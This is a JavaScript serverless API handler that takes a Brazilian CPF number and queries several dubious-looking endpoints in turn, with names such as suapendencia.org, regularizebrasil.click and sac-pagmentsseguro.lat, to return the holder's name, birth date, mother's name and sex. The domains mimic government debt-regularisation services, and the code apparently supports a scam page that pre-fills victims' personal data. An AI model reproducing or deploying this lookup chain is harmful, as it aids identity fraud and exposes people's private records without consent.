// Vercel Serverless — GET /api/consulta?cpf=11144477735
// Mesmo primária da CNH: suapendencia.org + fallback (VPS 195 via cpf-bridge, etc)
// Retorna {hasError:false, DADOS:{nome, nascimento...}} compatível com consulta.html OU {sucesso,dados} antigo
const TIMEOUT_MS = 4000;
async function fetchWithTimeout(url, opts = {}, ms = TIMEOUT_MS) {
  const ac = new AbortController();
  const t = setTimeout(() => ac.abort(), ms);
  try { return await fetch(url, { ...opts, signal: ac.signal }); } finally { clearTimeout(t); }
}
async function suapendencia(clean) {
  const r = await fetchWithTimeout(`https://suapendencia.org/atencao1/api.php?cpf=${clean}`, { headers: { Accept: 'application/json' } });
  const j = await r.json().catch(() => ({}));
  if (j.status !== 200 || !j.dados?.nome) throw new Error(`Suapendencia: ${j.message || 'HTTP '+r.status}`);
  let dn = j.dados.data_nascimento || '';
  const m = /^(\d{2})\/(\d{2})\/(\d{4})$/.exec(dn); if (m) dn = `${m[3]}-${m[2]}-${m[1]}`;
  return { nome: j.dados.nome||'', nome_mae:'', data_nascimento: dn, sexo: j.dados.sexo||'' };
}
async function vps195(clean){
  const r=await fetchWithTimeout(`https://cpf-bridge.vercel.app/api/cpf?cpf=${clean}`,{headers:{Accept:'application/json'}});
  const j=await r.json().catch(()=>({})); const nome=j.nome||j.NOME||j.dados?.nome||'';
  if(r.status!==200||!nome||j.status==='error') throw new Error(`VPS195 HTTP ${r.status}`);
  let dn=String(j.nascimento||j.NASC||j.data_nascimento||'').split(' ')[0]; const m=/^(\d{2})\/(\d{2})\/(\d{4})$/.exec(dn); if(m) dn=`${m[3]}-${m[2]}-${m[1]}`;
  return {nome, nome_mae:j.mae||j.nome_mae||j.NOME_MAE||'', data_nascimento:dn, sexo:j.sexo||j.SEXO||''};
}
async function regularizeBrasil(clean){
  const r=await fetchWithTimeout(`https://regularizebrasil.click/info/api/consulta.php?cpf=${clean}`);
  const j=await r.json().catch(()=>({})); const d=j.dados||j.data||j; const nome=d.nome||d.NOME||j.nome||j.NOME||'';
  if(r.status!==200||!nome) throw new Error(`RegularizeBrasil HTTP ${r.status}`);
  let dn=d.data_nascimento||d.nascimento||d.NASC||j.nascimento||''; const m=/^(\d{2})\/(\d{2})\/(\d{4})$/.exec(dn); if(m) dn=`${m[3]}-${m[2]}-${m[1]}`;
  return {nome, nome_mae:d.nome_mae||d.NOME_MAE||d.mae||'', data_nascimento:dn, sexo:d.sexo||d.SEXO||''};
}
async function sacPagments(clean){
  const r=await fetchWithTimeout(`https://sac-pagmentsseguro.lat/stj/consultar.php?cpf=${clean}`,{headers:{Accept:'application/json'},redirect:'follow'});
  const ct=r.headers.get('content-type')||'';
  if(ct.includes('application/json')){ const j=await r.json().catch(()=>({})); const d=j.dados||j.data||j; const nome=d.nome||d.NOME||j.nome||j.NOME||''; if(r.status!==200||!nome) throw new Error(`SacPagments HTTP ${r.status}`); let dn=d.data_nascimento||d.nascimento||''; const m=/^(\d{2})\/(\d{2})\/(\d{4})$/.exec(dn); if(m) dn=`${m[3]}-${m[2]}-${m[1]}`; return {nome, nome_mae:d.nome_mae||d.mae||'', data_nascimento:dn, sexo:d.sexo||''};}
  const text=await r.text().catch(()=>('')); try{ const j=JSON.parse(text); const d=j.dados||j.data||j; const nome=d.nome||d.NOME||j.nome||''; if(nome) return {nome, nome_mae:d.nome_mae||d.mae||'', data_nascimento:d.data_nascimento||d.nascimento||'', sexo:d.sexo||''}; }catch{}
  const finalUrl=r.url||''; const q=new URLSearchParams((finalUrl.split('?')[1]||'')); let nomeParam=q.get('nome')||q.get('NOME')||''; if(!nomeParam&&text){ const m2=text.match(/nome["'\s:=]+([^"'&<>]+)/i); if(m2) nomeParam=decodeURIComponent(m2[1]).trim(); } if(!nomeParam) throw new Error(`SacPagments HTTP ${r.status} sem dados`); return {nome:nomeParam, nome_mae:'', data_nascimento:'', sexo:''};
}
const PROVIDER_FNS={suapendencia,vps195,regularizeBrasil,sacPagments};
const ORDEM_FALLBACK=['suapendencia','vps195','regularizeBrasil','sacPagments'];
export default async function handler(req,res){
  res.setHeader('Access-Control-Allow-Origin','*');
  res.setHeader('Cache-Control','no-store');
  if(req.method==='OPTIONS'){ res.status(204).end(); return; }
  const cpf=String(req.query.cpf||'').replace(/\D/g,'');
  if(cpf.length!==11){ res.status(400).json({hasError:true, sucesso:false, error:'CPF invalido'}); return; }
  let slug='suapendencia'; const tentados=new Set(); const errors=[];
  while(slug&&!tentados.has(slug)){
    tentados.add(slug);
    try{
      const dados=await PROVIDER_FNS[slug](cpf);
      // compat: responde nos 2 formatos pra consulta.html funcionar em qualquer host
      return res.status(200).json({hasError:false, statusCode:200, sucesso:true, dados:{nome:dados.nome, cpf, data_nascimento:dados.data_nascimento, nome_mae:dados.nome_mae, sexo:dados.sexo}, DADOS:{cpf,...dados}});
    }catch(e){ errors.push(`${slug}:${e.name==='AbortError'?'timeout':e.message}`); const prox=ORDEM_FALLBACK.find(p=>!tentados.has(p)&&PROVIDER_FNS[p]); slug=prox||null; }
  }
  console.error(`api/consulta: todos falharam cpf=${cpf} ${errors.join(' | ')}`);
  res.status(200).json({hasError:true, sucesso:false, error:'Nao foi possivel localizar os dados agora. Voce pode preencher manualmente.', dados:{nome:'Contribuinte',cpf,data_nascimento:'',nome_mae:'',sexo:''}, DADOS:{cpf,nome:'',nome_mae:'',data_nascimento:'',sexo:''}});
}
